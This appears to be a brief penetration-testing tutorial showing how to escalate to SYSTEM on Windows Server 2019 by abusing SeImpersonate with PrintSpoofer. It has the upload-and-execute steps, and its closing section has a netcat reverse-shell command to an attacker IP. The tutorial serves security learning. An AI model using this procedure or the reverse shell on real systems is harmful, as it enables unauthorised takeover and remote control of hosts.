# PrintSpoofer

[Rogue-Potato](https://k4sth4.github.io/Rogue-Potato/) abused SeImpersonate privilege to get execution as SYSTEM for Windows Server 2019. [PrintSpoofer](https://github.com/k4sth4/PrintSpoofer/blob/main/PrintSpoofer.exe) can be an alternate to [Rogue-Potato](https://k4sth4.github.io/Rogue-Potato/). You can exploit SeImpersonate privilege on Windows Server 2019 with [PrintSpoofer](https://github.com/k4sth4/PrintSpoofer/blob/main/PrintSpoofer.exe) and it's so easy.

## Exploitation
```markdown
whomai /priv
```

![OnPaste 20220611-195845](https://user-images.githubusercontent.com/106917304/173192084-79da14f7-145a-455c-9e9c-8a61183a3d08.png)


Check for systeminfo

![OnPaste 20220611-200054](https://user-images.githubusercontent.com/106917304/173192153-437fb579-81f4-400f-a694-8621b7570106.png)

The OS is Microsoft Windows server 2019 and x64-bit arch. SeImpersonate privilege is Enabled. With this information it seems that host is likey vulnerable to [PrintSpoofer](https://github.com/k4sth4/PrintSpoofer/blob/main/PrintSpoofer.exe).

Upload the [PrintSpoofer](https://github.com/k4sth4/PrintSpoofer/blob/main/PrintSpoofer.exe) to target machine.

![OnPaste 20220611-200357](https://user-images.githubusercontent.com/106917304/173192261-06ff1f16-13a3-485f-af1f-3af85c03543e.png)

Execute the exploit.
```markdown
.\PrintSpoofer.exe -i -c cmd
```

![OnPaste 20220611-200624](https://user-images.githubusercontent.com/106917304/173192321-9d8ab1dc-b2bf-4303-97cb-d0ae41cbdabd.png)

We're SYSTEM now!

#### Alternate
We can also get a reverse shell if we want.
Execute nc binary with PrintSpoofer.
```markdown
.\PrintSpoofer.exe -c ".\nc.exe 10.11.x.x 443 -e cmd"
```


